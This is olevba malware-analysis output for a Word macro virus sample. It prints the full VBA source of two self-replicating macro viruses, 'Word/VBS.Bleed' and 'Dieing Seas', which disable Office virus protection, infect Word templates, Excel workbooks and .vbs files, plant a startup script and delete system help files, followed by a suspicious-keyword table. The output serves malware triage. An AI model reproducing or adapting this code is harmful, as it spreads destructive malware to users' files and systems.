olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi.d-605f272ffe9c096fe32700e1c1abd5563ba13bdb
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Vibisi.d-605f272ffe9c096fe32700e1c1abd5563ba13bdb 
in file: Virus.MSWord.Vibisi.d-605f272ffe9c096fe32700e1c1abd5563ba13bdb - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Call vibisi '
Sub vibisi() '
On Error Resume Next '
Dim fso, f, wo, nucode, code, jcode '
nucode = "" '
code = "" '
jcode = "" '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
full = f.readall '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
For i = 1 To 200 '
code = f.readline '
For j = 1 To Int(Rnd * 30): jcode = jcode & Chr(65 + Int(Rnd * 22)): Next '
nucode = nucode & code & Chr(39) & jcode & vbCr '
If Int(Rnd * 3) = 2 Then nucode = nucode & Chr(39) & jcode & vbCr '
jcode = "" '
If code = "" Then Exit For '
code = "" '
Next '
Set f = fso.opentextfile(wscript.scriptfullname, 2, True) '
f.writeline nucode '
Set wo = CreateObject("word.application") '
With wo.Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
Set f = Nothing '
For i = 1 To wo.Application.FileSearch.FoundFiles.Count '
If wo.Application.FileSearch.FoundFiles(i) <> wscript.scriptfullname Then '
Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True) '
f.writeline full '
End If '
Next '
wo.Options.VirusProtection = (Rnd * 0) '
wo.Options.SaveNormalPrompt = (Rnd * 0) '
wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname '
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs" '
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1 '
wo.NormalTemplate.Save '
wo.Quit '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase"
End Sub '
Sub autoopen()
On Error Resume Next '
Dim v(2000): t = Chr(39)
Options.VirusProtection = (Rnd * 0) '
Options.SaveNormalPrompt = (Rnd * 0) '
For i = 1 To ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), t) '
v(i) = Left(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20)) '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next '
e_: '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile("c:\scriptO8.ini", 2, True) '
cp = "Attribute VB_Name = ""vbs""" & vbCr '
f.write cp '
f.write vc '
If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini" '
If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then '
ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini" '
ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
With Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
For x = 1 To Application.FileSearch.FoundFiles.Count '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True) '
codex = "call vibisi" & chr(39) & vbcr & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
f.write codex '
Next '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase" , 0, "Word/VBS.Bleed"
End Sub '


$#WM97/XM97 Dieing Seas by Yozak
Attribute VB_Name = "DieingSeas"
Sub DieLikeEver1()
Dim an As Boolean, ar As Boolean
VBA.SetAttr NormalTemplate.FullName, vbNormal
Options.SaveNormalPrompt = 1 - 1
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\ra"
Set nonono = NormalTemplate.VBProject.VBComponents
Set acacac = ActiveDocument.VBProject.VBComponents
For x = 1 To nonono.Count
If nonono(x).Name = "DieingSeas" Then an = True
Next x
For f = 1 To acacac.Count
If acacac(f).Name = "DieingSeas" Then ar = True
Next f
If an = True And ar = False Then acacac.import "c:\ra"
If an = False And ar = True Then nonono.impory "c:\ra"
Kill "c:\ra"
End Sub
Sub AutoOpen()
DieLikeEvery1
JmpToExcell
SickBomb
RunAtStartUp
End Sub
Sub SickBomb()
If Day(Now) = 13 Then
MsgBox "We are Just A Drop In The Ocean!", vbApplicationModal, "Dieing Seas"
Do
Ram = InputBox("Give me a word!", "Now")
Loop Until Ram = "Die"
MsgBox "Die"
Kill "c:\windows\help\*.cnt"
End If
End Sub
Sub RunAtStartUp()
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\windows\system\code.infected"
Kill "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs"
Open "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs" For Random As vbs
Print vbs; "On Error Resume Next"
Print vbs; "Set WordObj=CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print vbs; "Set NT=WordObj.NormalTemplate"
Print vbs; "NT.VBproject.Vbcomponents.import " & Chr(34) & "C:\windows\system\code.infected" & Chr(34)
Print vbs; "nt.save"
Print vbs; "WordObj.Close"
Close vbs
End Sub
Sub JumpToExcell()
Set Exc = CreateObject("Excel.Application")
SetAttr Exc.StartupPath & "\book1.", vbNormal
Set nr = Exc.Workbooks.Add
Set rt = nr.Vbprojects.VBComponents("ThisWorkBook").CodeModule
rt.InserLines 1, VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 116)
nr.SaveAs Exc.StatUpPath & "\book1."
nr.Close
End Sub
Private Sub Workbook_Open()
Application.ScreenUpdating = (4 - 4)
Application.EnableCancelKey = xlDisabled
Options.VirusProtection = (0 - 0)
If (Dir(Application.StartupPath & "\Book1.")) <> "" Then
SetAttr Application.StartupPath * "\Book1.", vbNormal
End If
Set Grand = Workbooks.Add
Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
f = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 116)
Grand.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
Grand.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
Grand.Close
Set fs = Application.FileSearch
fs.NewSearch
fs.LookIn = ActiveWorkbook.Path
fs.FileName = "*.xls"
fs.SearchSubFolders = True
fs.Execute msoSortByFileName
For x = 1 To fs.FoundFiles.Count
Set tEmp = Workbooks.Open(fs.FoundFiles(x))
If tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 1) <> "Sub DieLikeEvery1()" Then
tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
Source = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 116)
tEmp.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
tEmp.Save
End If
tEmp.Close
Next x
Application.ScreenUpdating = True
SickBomb
JmpWord
End Sub
Sub JmpWord()
conte = VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 116)
Set wordobj = CreateObject("Word.Application")
Set nt = wordobj.NormalTemplate.VBProject.VBComponents
Set fso = CreateObject("Scripting.FileSystemObject")
Kill "c:\ra"
Set r = fso.opentextfile("C:\ra", 2, True)
r.writeline "Attribute VB_Name = " & Chr(34) & "DieingSeas" & Chr(34)
r.writeline conte
r.Close
nt.import "c:\ra"
wordobj.NormalTemplate.Save
Kill "c:\ra"
wordobj.Quit
End Sub
Sub ViewVbCode()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Sub ToolsMacro()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Rem +++++++++Dieing Seas Office 97 Virus+++++++++
Rem This is a little bug that infects excel and
Rem Word at the same time :-)
Rem It isn't very good bcoz too much work lately
Rem Also it's stealth Sux
Rem In a newer Version Everything will be differnt
Rem ++++++++++++++++++++++++++++++++++++++++++++++
Rem Created By Yozak=00= for MetaPhase :-) greetz to Knowdeth & bsl4
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |StartUp.vbs         |Executable file name                         |
|IOC       |viewcode.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
